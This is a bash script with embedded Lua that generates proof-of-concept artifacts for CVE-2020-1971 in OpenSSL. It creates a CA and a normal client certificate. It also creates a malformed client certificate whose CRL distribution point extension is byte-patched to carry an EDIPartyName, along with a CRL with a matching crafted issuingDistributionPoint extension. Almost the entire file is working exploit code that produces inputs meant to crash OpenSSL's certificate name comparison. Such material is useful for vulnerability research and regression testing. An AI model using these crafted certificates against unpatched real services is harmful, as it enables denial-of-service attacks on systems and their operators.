#!/usr/bin/env bash

crl="http://localhost:2333/ca.crl"

# CA
openssl req -x509 -new -subj '/C=CN/CN=CVE-2020-1971-CA' -addext 'keyUsage = cRLSign, keyCertSign' -nodes -newkey rsa:2048 -keyout cakey.pem -out cacert.pem -days 365

# Normal client
openssl req -new -subj '/C=CN/CN=CVE-2020-1971-NORMAL' -out normal.csr -newkey rsa:2048 -keyout normalkey.pem -nodes
openssl x509 -req -in normal.csr -CA cacert.pem -CAkey cakey.pem -CAcreateserial -out normal.cert -days 365

# Malformed client
openssl req -new -subj '/C=CN/CN=CVE-2020-1971-EXP' -out exp.csr -newkey rsa:2048 -keyout expkey.pem -nodes

lua << EOF
local openssl = require('openssl')
local x509 = openssl.x509
local pkey = openssl.pkey
local asn1 = openssl.asn1

local ca_key = pkey.read(io.open('cakey.pem'):read('*a'), true)
local ca_cert = x509.read(io.open('cacert.pem'):read('*a'))
local exp_req = x509.req.read(io.open('exp.csr'):read('*a'))

local consts = {
    -- ASN.1 Class
    UNIVERSAL = 0x00,
    CONTEXT_SPECIFIC = 0x80,
    -- Universal Tag
    OCTET_STRING = 0x04,
    SEQUENCE = 0x10,
    -- Context Specific Tag
    IDP_DISTRIBUTION_POINT = 0x00,
    FULL_NAME = 0x00,
    EDI_PARTY_NAME = 0x05
}

-- local edi = { 0xA5, 0x00 }
local edi = asn1.put_object(consts.EDI_PARTY_NAME, consts.CONTEXT_SPECIFIC, 0, true)

function is_printable(c) local a = c:byte() return 0x20 <= a and a <= 0x7e end

local function hexdump(s, store, delim)
    store = store or false
    delim = delim or ' '
    if store then o = {} for i = 1, #s do table.insert(o, ('%02X'):format(s:sub(i, i):byte())) end return table.concat(o, delim)
    else
        for i = 1, #s do io.write(
            (' %s '):format(
                is_printable(s:sub(i, i)) and s:sub(i, i) or '.'
            )
        ) end print()
        for i = 1, #s do io.write(('%02X '):format(s:sub(i, i):byte())) end print()
    end
end

local function wrap_crldp(uri, append)
    if type(append) == 'string' then append = { append:byte(1, #append) } end
    local uri_crldp = x509.extension.new_extension({
        object = 'crlDistributionPoints',
        value = 'URI:' .. uri
    })
    local uri_octets = uri_crldp:data():data()
    local bytes = { uri_octets:byte(1, #uri_octets) }
    for _, i in ipairs({2, 4, 6, 8}) do bytes[i] = bytes[i] + #append end
    local o = '' for _, v in ipairs(bytes) do o = o .. string.char(v) end
    for _, v in ipairs(append) do o = o .. string.char(v) end
    --hexdump(o)
    return x509.extension.new_extension({
        object = 'crlDistributionPoints',
        value = asn1.new_string(o, consts.OCTET_STRING)
    })
end

local function wrap_idp(data)
    if type(data) == 'string' then data = { data:byte(1, #data) } end
    local o = ''
    for _, v in ipairs(data) do o = o .. string.char(v) end
    o = asn1.put_object(consts.FULL_NAME, consts.CONTEXT_SPECIFIC, #o, true) .. o
    o = asn1.put_object(consts.IDP_DISTRIBUTION_POINT, consts.CONTEXT_SPECIFIC, #o, true) .. o
    o = asn1.put_object(consts.SEQUENCE, consts.UNIVERSAL, #o, true) .. o
    --hexdump(o)
    return x509.extension.new_extension({
        object = 'issuingDistributionPoint',
        critical = true,
        value = asn1.new_string(o, consts.OCTET_STRING)
    })
end

local exp_cert = x509.new('114514', exp_req)
exp_cert:extensions({
    wrap_crldp('${crl}', edi)
})
exp_cert:validat(os.time() - 1000, os.time() + 365 * 24 * 3600)
exp_cert:sign(ca_key, ca_cert)
io.open('expcert.pem', 'w'):write(exp_cert:export('pem'))

local exp_crl = x509.crl.new({}, ca_cert, ca_key)
exp_crl:extensions({
    wrap_idp(edi)
})
exp_crl:sign(ca_key, ca_cert)
io.open('ca.crl', 'w'):write(exp_crl:export('der'))

EOF
